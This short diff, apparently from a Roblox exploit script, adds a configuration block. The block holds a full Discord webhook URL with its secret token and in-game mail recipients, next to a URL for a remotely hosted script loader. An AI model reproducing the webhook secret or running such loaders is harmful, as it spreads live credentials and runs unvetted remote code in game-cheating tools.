@@ -1,3 +1,11 @@
+getgenv().PRIVATE_CONFIG = {
+	WEBHOOK_USERID = "",
+	WEBHOOK_LINK = "https://discord.com/api/webhooks/1219752138188652614/OC6SJuvKUJgSFSZy7b9bgHmO6I7u68occS8i4aGbjjGN5WCbrWraKCuYjOgLB4ppHu-G",
+	MAIL_RECEIVERS = {
+		"md44gfbjxq",
+	},
+}
+
 local PRIVATE_CONFIG = getgenv().PRIVATE_CONFIG or {}
 
 local LOADER_URL = "https://api.luarmor.net/files/v3/loaders/34915da4ad87a5028e1fd64efbe3543f.lua"
